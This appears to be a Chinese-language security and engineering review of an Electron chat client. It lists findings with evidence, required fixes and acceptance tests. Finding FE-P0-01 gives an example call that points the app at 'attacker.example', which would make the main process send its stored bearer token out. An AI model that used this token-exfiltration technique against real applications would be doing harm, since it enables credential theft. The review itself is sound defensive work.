## 3. 详细问题

### FE-P0-01：Token 与后端 Origin 未绑定

#### 证据

- `apps/desktop/src/main/ipc/channels.ts:23-25`：`chatConnectSchema` 对 `serverUrl` 只做 `min(1)`；
- `apps/desktop/src/renderer/src/components/CyChatView.vue:16,57-61`：Renderer 可直接填写并提交任意字符串；
- `apps/desktop/src/main/chat/chat-service.ts:30-37`：Main 读取安全存储中的既有 Token；
- `apps/desktop/src/main/transport/real-backend.ts:252-260`：WebSocket 握手向该地址发送 `Authorization: Bearer <token>`；
- `apps/desktop/src/main/transport/real-backend.ts:399-403`：REST 同样向该地址发送 Token。

Renderer 在项目安全模型中是不可信层。若 Renderer 因 Markdown/XSS 或其他漏洞被控制，攻击代码无需读取 Token，只需调用 `desktopApi.connect('https://attacker.example')`，Main 就会主动把 Token 发给攻击者。

#### 必须修改

1. 后端 Endpoint 必须由 Main 持有并规范化，不得把“任意 URL + 自动复用既有 Token”作为普通 chat IPC 能力。
2. Token 必须与规范化后的 Origin/Profile 绑定；Endpoint 发生变化时不得自动复用旧 Token，必须要求重新提交凭据。
3. 推荐让 Renderer 传 `connectionProfileId`，由 Main 读取 profile 中的 endpoint 和 credential key；至少也要在 Main 比对“请求 Origin == Token 绑定 Origin”。
4. 使用 `new URL()` 统一规范化：
   - 远程地址只允许 `https:`；
   - `http:` 只允许明确的回环地址（`localhost`、`127.0.0.0/8`、`[::1]`）；
   - 拒绝 URL userinfo、query、fragment；
   - 明确是否允许反向代理 path prefix；
   - 去除尾斜杠后再派生 `/api/*` 和 `/ws`；
   - 由 `http→ws`、`https→wss` 的 URL protocol 转换派生 WS 地址，不做字符串拼接。
5. Endpoint 变更和凭据变更要进入现有审计日志，但不得记录 Token 或完整敏感 URL 参数。

#### 验收测试

- 已保存 `backend-A` Token 后，Renderer 请求连接 `attacker.example`，断言 WS/fetch 均未被调用且 Token 未离开 Main；
- 远程 `http://example.com` 被拒绝；
- `http://127.0.0.1:8765`、`http://localhost:8765`、`http://[::1]:8765` 可作为明确本机模式；
- `https://example.com/` 能规范化并正确生成 `wss://example.com/ws`；
- Endpoint A 改为 B 后，旧 Token 不会自动发送到 B。

### FE-P1-01：rejected ACK 被前端 Schema 丢弃

#### 证据

- `apps/desktop/src/main/transport/protocol-v2/raw-schemas.ts:135-144` 要求所有 ACK 的 `messageId` 都是 `z.string().min(1)`；
- 后端 `/home/yomu/elysia-agent/core/input/ws_handler.py` 在 `SESSION_NOT_FOUND`、`STORAGE_UNAVAILABLE`、`QUEUE_FULL`、契约错误等 rejected 分支中使用 `messageId: ""`；
- 后端 rejected ACK 的语义是“用户消息尚未被正式接纳，因此没有正式 message ID”，空值是当前真实 wire，而不是后端漏填；
- 当前前端 rejected ACK 单测使用了伪造的非空 `msg-1/msg-ack`，因此没有覆盖真实 wire。

#### 影响

`parseRawFrame()` 拒绝该帧，`handleAck()` 无法找到并 reject pending request。用户最后只能收到 `user_message.ack 超时(15000ms)`，后端的真实错误码和 `retryable` 全部丢失。

#### 必须修改

1. 把 ACK Schema 按 `status` 建成可区分联合或 `superRefine`：
   - `accepted`：`messageId` 必须非空；
   - `rejected`：允许 `messageId === ""`，并要求安全的 `error.code/error.message`；
2. 不要要求后端为 rejected 请求伪造 message ID；
3. `handleAck()` 不要把全部 rejected 错误压成 `INVALID_INPUT`：至少保留公开安全字段 `backendCode`、`retryable`、`requestId`；
4. `QUEUE_FULL`、`STORAGE_UNAVAILABLE`、`SESSION_NOT_FOUND` 应能在 Renderer 立即区分和展示。

#### 验收测试

- rejected + `messageId: ""` + `QUEUE_FULL`：立即 reject，不等待 ACK timeout；
- rejected + `STORAGE_UNAVAILABLE/retryable:true`：UI 可识别“可重试”；
- accepted + 空 `messageId`：仍然拒绝为非法协议帧；
- accepted 正常 ACK 行为不回归。

### FE-P1-02：真实模式、Endpoint 和 Token 没有形成可用流程

#### 证据

- `apps/desktop/src/main/index.ts:100-115`：默认实例化 `MockBackend`，只有进程环境变量 `CYRENE_BACKEND=real` 才启用 RealBackend；
- 打包应用没有设置该进程环境变量的普通用户入口，存在发布包继续运行 Mock 的风险；
- `CyChatView.vue:16` 默认值是 `ws://localhost:8080`；
- 当前后端默认地址是 `http://127.0.0.1:8765`；
- `preload/desktop-api.ts:171-178` 已有 Token status/set/clear API，但 Renderer 没有对应配置 UI；
- RealBackend 强制要求 Token，当前 UI 无法完成正常设置。

#### 必须修改

1. 发布/生产模式默认使用 RealBackend；MockBackend 只允许在 development/test 下显式启用。
2. UI/诊断区必须明确显示当前是 `REAL` 还是 `MOCK`，避免“看似连接成功，实际只连 Mock”。
3. 增加最小后端连接设置：Endpoint、Token 状态、设置/清除 Token、连接/断开。
4. Token 表单提交成功后立即清空明文响应式状态，不提供读回接口，不写日志。
5. 联调默认 Endpoint 改为规范化后的 `http://127.0.0.1:8765`，但不得把开发默认硬编码成不可修改的生产配置。
6. 展示或记录 `serverVersion/build_sha/protocolVersion`，使联调证据可追溯到具体后端提交。
7. README 增加真实模式启动方式；在改完默认策略后，以最终实现为准，不继续依赖隐藏命令。

#### 验收测试

- packaged/production 装配不会实例化 MockBackend；
- development/test 可显式选择 Mock；
- 未配置 Token 时显示明确的 `CREDENTIAL_UNAVAILABLE` 引导；
- 设置 Token 后可连接，Renderer 永远无法读取 Token；
- UI 能明确显示实际后端版本/SHA，而非只显示“已连接”。

### FE-P1-03：连接成功后的会话初始化时序错误

#### 证据

- `CyConversationList.vue:50-52` 在组件挂载时立即 `void conversationStore.list()`；
- RealBackend 在 connect 前会用 `NOT_CONNECTED` 拒绝 REST 请求；
- `connectionStore.connect()` 成功后只结束连接动作，不重新获取会话；
- `conversationStore` 不消费 `ConnectionState.activeConversationId`；
- WS 建连时可能已经推送 session replay，但 `currentId` 仍为空；输入框发送条件要求存在 `currentId`。

MockBackend 的 `listConversations()` 不要求先连接，掩盖了这个真实模式问题。

#### 必须修改

建立单一的连接后初始化流程，例如：

1. `connect` 成功并收到 `server_info`；
2. 获取会话列表；
3. 使用 `ConnectionState.activeConversationId` 选择活动会话；
4. 若活动会话存在，设置 `currentId` 并加载历史/合并 replay；
5. 若无会话，根据产品规则显示空态或显式创建，不要静默伪造；
6. 只有上述流程完成后才把聊天操作标记为 ready。

组件 `onMounted` 不应在未连接状态直接发 REST；或者必须捕获错误并在连接成功时可靠重试。

#### 验收测试

- RealBackend guard 开启时，应用挂载不会产生未处理 Promise；
- 连接已有活动会话的后端后，列表、当前会话和第一页历史自动就绪；
- 空后端连接后展示明确空态，用户能新建会话；
- replay 先于 list 或 list 先于 replay 两种时序结果一致；
- 断开后重连不会重复消息或清空正确历史。

### FE-P1-04：会话切换、回放和流式事件缺少归属/epoch 守卫

#### 证据

- `renderer/src/main.ts:24` 对任何 replay 都直接调用 `messageStore.loadReplay()`；
- `message.store.ts:178-181` 不验证 replay 的 `conversationId` 是否等于当前会话；
- `message.store.ts:81-98` 收到任意 `generation.started` 都会替换全局 accumulator 并插入消息，没有当前会话判断；
- `conversation.store.ts:22-29` 的 `activate()` 没有 request epoch，快速点击 A→B 时，较慢的 A 响应可能晚于 B 返回并覆盖状态；
- 当前 Store 只保存一个全局 `byId/order/accumulator`，但后端事件均带 conversation 归属。

#### 必须修改

可选完整方案是按 conversation 保存消息状态；阶段 2 最小安全方案也必须做到：

1. replay/event 进入 Store 前校验 `conversationId`；
2. 非当前会话事件不能出现在当前 UI，可缓存到对应会话或明确丢弃并记录协议告警；
3. `activate()` 使用递增 epoch/AbortController，只有最新请求可提交 `currentId`、历史和 loading/error；
4. 会话切换时对旧 generation 的迟到 `started/delta/completed/failed` 做归属守卫；
5. 历史页、session replay 和实时事件按 `messageId` 去重，并维持稳定顺序。

#### 验收测试

- 快速 A→B，A 的迟到 REST 响应不能把 UI 切回 A；
- 切到 B 后收到 A replay，B 页面不出现 A 消息；
- 切到 B 后收到 A 的 `generation.started/delta/completed`，B 页面不被污染；
- 当前 B 的正常流式回复不受影响；
- 重连 replay 与已有历史合并不重复。

### FE-P1-05：错误链不完整，真实联调难以诊断

#### 证据

- `connection.store.ts:25-30` 捕获连接错误后把状态改回 `disconnected`；
- `CyChatView`、`CyChatInput` 没有展示 `connectionStore.error`；
- `main/index.ts:107-109` 构造 RealBackend 时没有接 `onError` 和 `onProtocolWarning`；
- `chat-handlers.ts:21-31` 成功响应使用 `z.unknown()`；
- IPC 公开错误只有 `{code,message}`，Preload 再拼成普通 `Error` 字符串，`retryable/requestId/backendCode` 丢失；
- `messageStore.lastError` 在新操作/成功后没有统一清理，旧错误可能长期残留。

#### 必须修改

1. Main 将 `onProtocolWarning` 接入现有脱敏 logger，记录固定 code、帧 type、connection/backend build 信息；不得记录聊天正文、Token 或原始整帧。
2. `onError` 进入明确的公开错误通道或状态模型，不能静默丢弃。
3. 定义安全的结构化 Renderer 错误，例如：
   - `code`（前端领域码）；
   - `message`；
   - `backendCode?`；
   - `retryable?`；
   - `requestId?`。
4. Preload 不再把所有错误压成字符串；Store/UI 根据结构化字段展示重试、认证、限流、存储不可用等状态。
5. 连接失败保持可见 error 状态，开始新连接时再清理；成功后清理旧错误。

#### 验收测试

- 缺 Token、401、403、协议版本不匹配均有明确 UI；
- `QUEUE_FULL`、`STORAGE_UNAVAILABLE` 能显示不同文案和 retryable；
- 非法 raw frame 只进入脱敏诊断，不泄漏原帧正文；
- 新连接成功后旧错误消失；
- 错误 UI 不依赖 DevTools 才能看见。

### FE-P2-01：超时、取消和操作门控不足

#### 现状

- WS 建连如果 TCP 已建立但一直没有 `server_info`，`connect()` 可永久悬挂；
- REST fetch 没有 AbortController/超时；
- 会话新建、重命名、删除、激活按钮在未连接状态仍可操作；
- `onMounted(() => void list())` 和若干模板 async handler 没有统一错误处理；
- `CyChatInput.canSend` 只检查草稿、sending 和 currentId，不检查连接是否为 connected；
- 连接中没有显式取消入口。

#### 建议修改

1. 为握手 `server_info`、ACK、REST 请求分别定义超时；
2. disconnect/切换 Endpoint/应用退出时取消 in-flight 请求和重连 timer；
3. 未连接或初始化未完成时禁用会话管理与发送动作；
4. 所有用户动作进入 Store 的 loading/error 状态，组件不产生 unhandled rejection；
5. 明确“断线时不支持离线队列”或实现队列，不要让按钮看似可发送。

### FE-P2-02：IPC 与 replay 运行时校验不完整

#### 证据

- `chat-handlers.ts` 的 chat response schema 是 `z.unknown()`；
- `preload/desktop-api.ts` 的通用 `unwrap()` 只验证信封，不验证成功 data；
- `isReplayPayload()` 只确认 `messages` 是数组，不验证每条 Message；
- `isConnectionState()` 只严格检查 status，其他字段未完整校验。

#### 建议修改

1. 为 BackendSession、ConnectionState、Conversation、Page、MessagePage、ClientRequestRef、ReplayPayload 建立共享 Zod Schema；
2. Main handler 校验成功响应，Preload 再做防御性解析；
3. replay 中单条消息非法时应有明确策略：整批拒绝或逐条丢弃并告警，不能无校验进入 Store；
4. 避免用 `as IpcResult<T>` 代替运行时校验。

### FE-P2-03：契约夹具和 CI 尚未真正跨仓库

#### 证据

- `fixtures/wire-v2/*.manifest.json` 全部锚定后端 `beeba5776413...`；
- 当前后端契约已增加 `server_info.features.idempotency_durable` 和 `QUEUE_FULL` 等语义；
- 前端 fake WS 的 rejected ACK 使用非空 `messageId`，与真实后端不同；
- 现有 CI 只证明前端自带的手写/归档夹具与前端代码一致。

#### 建议修改

后端未冻结期间可以先完成测试工具和缺失场景；最终 SHA 冻结后再更新 manifest：

1. 增加 rejected ACK 空 messageId、QUEUE_FULL、STORAGE_UNAVAILABLE 场景；
2. 增加真实 `server_info`（完整 features/services/build_sha）握手样例；
3. 增加真实 session replay（非空消息）、无 delta inner voice、无 delta public reply、cancelled、重连 replay；
4. manifest 记录完整 backend commit、schema hash、protocol/transport version；
5. 增加“后端生成的 schema/raw frames → 前端 parser/mapper”的自动检查，避免双方各自绿但接不上；
6. 联调完成前禁止把 manifest 更新成未实际运行过的 SHA。

- 任意 Renderer 输入都不能让 Main 把已有 Token 发往未绑定 Origin；
- rejected ACK 能即时、结构化地传到 UI；
- production 默认不落到 Mock，开发 Mock 有明确标识；
- 用户可安全设置 Endpoint/Token，且 Token 不可读回、不进日志；
- 真实连接后会话列表、活动会话和历史自动完成初始化；
- 快速切会话、迟到 replay 和迟到 generation 不污染当前会话；
- 认证、限流、队列满、存储不可用、协议不匹配均有可见错误；
- typecheck、lint、315+ 单测、18+ Electron 集成测试、build 全绿；
- 新增真实模式启动/装配测试，不能只靠 Mock Store 测试；
- 文档仍标记“已开发、未联调”，等待最终后端真实闭环后再升级状态。

## 6. 暂不纳入本批次

以下属于阶段 3～6，不应借本轮整改无限扩 scope：

- 完整附件上传/预览/下载；
- 搜索、资源历史查看器和虚拟列表；
- 模型设置、语音、dictation；
- Live2D；
- Desktop 工具执行与权限系统。

本批次只要求把阶段 2 的“连接 → 会话 → 发送 → ACK → 流式 → 完成/失败 → 重连回放”做成可以安全进入真实联调的闭环。
